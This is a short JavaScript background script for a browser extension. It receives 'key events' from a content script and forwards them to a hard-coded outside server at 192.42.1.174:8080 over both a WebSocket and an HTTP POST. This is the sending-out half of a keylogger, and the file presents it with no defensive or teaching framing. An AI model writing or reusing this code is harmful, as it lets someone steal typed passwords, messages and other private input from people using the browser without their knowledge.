// Handle WebSocket connection
const socket = new WebSocket('wss://192.42.1.174:8080');
socket.addEventListener("open", (event) => {
    socket.send("Hello Server!");
});

// Listen for key events from content script and send via WebSocket
browser.runtime.onMessage.addListener((message) => {
    if (message.action === 'sendData') {
        const data = message.data;

        // Send data via WebSocket
        if (socket.readyState === WebSocket.OPEN) {
            socket.send(data);
        }

        // Send data via HTTP POST
        fetch('http://192.42.1.174:8080', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ data: data })
        }).then(response => {
            if (response.ok) {
                console.log('Data sent successfully');
            } else {
                console.error('Failed to send data');
            }
        }).catch(error => {
            console.error('Error sending data', error);
        });
    }
});
